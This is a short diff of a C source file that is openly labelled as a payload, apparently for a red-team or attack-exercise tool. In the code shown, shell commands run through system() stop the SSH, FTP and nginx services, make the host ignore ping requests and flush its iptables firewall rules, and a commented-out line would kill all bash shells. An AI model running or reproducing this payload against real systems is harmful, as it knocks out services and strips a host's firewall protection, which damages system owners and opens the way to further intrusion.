@@ -1,15 +1,16 @@
+//Michael Burke
+//Payload for the jumper. Anything in payload() will be executed.
+
 void stopServices(){
     system("systemctl stop sshd 2>/dev/null");
     system("systemctl stop vsftpd 2>/dev/null");
     system("systemctl stop nginx 2>/dev/null");
     system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all");
-
-
-    // system("killall bash");
+    //This one is just evil
+    //system("killall bash");
 }
 
 void dropAllFirewall(){
-
     //Flush iptables rules
     system("iptables -Z");
     system("iptables -F");
